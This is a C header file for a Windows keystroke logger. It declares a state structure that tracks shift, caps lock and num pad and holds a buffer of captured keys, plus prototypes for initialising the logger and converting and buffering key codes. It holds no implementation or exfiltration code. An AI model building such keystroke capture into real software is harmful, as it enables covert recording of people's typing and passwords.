
#include "utils.h"

#ifndef KEYLOGGER_H

#define NUM_KEYS 254  // 254 key
#define A 0x41  // key code for A
#define Z 0x5A

#define ZERO 0x30 // key code for 0
#define NINE 0x39

/**
 * structure to maintain state for the keys shift, caps lock,
 * and num pad keys
 * Also stores the keycodes and keeps track of the captured
 * keys that are to be logged
 */
typedef struct {
    BOOL shift;
    BOOL capsLock;
    BOOL numPad;
    // array of strings corresponding to their vkCodes
    KEY_PAIR* keyCodes[NUM_KEYS];
    // logged key buffer
    char keyBuffer[MAX_BUFF_LEN];
    int buffPtr;
} KEY_LOGGER_STATE;

// initialise the key logger
KEY_LOGGER_STATE* initKeyLogger();
// cleanup keylogger memory
void keyLoggerCleanup(KEY_LOGGER_STATE* klState);

// update the bool state variables based on the key, if it was updated returns true
BOOL updateKeyLoggerState(KEY_LOGGER_STATE* kLogger, WPARAM wParam, LPDWORD vkCode);
// retrieve the the character when shift is not pressed

ERR_CODE addKeyToBuffer(KEY_LOGGER_STATE* klState, LPDWORD vkCode);

char getKeyChar(KEY_LOGGER_STATE* klState, KEY_PAIR* kp, LPDWORD vkCode);

ERR_CODE writeStrToBuffer(KEY_LOGGER_STATE* klState, char* s);

// initialise the key codes
void initKeyCodes(KEY_LOGGER_STATE* klState);

#endif
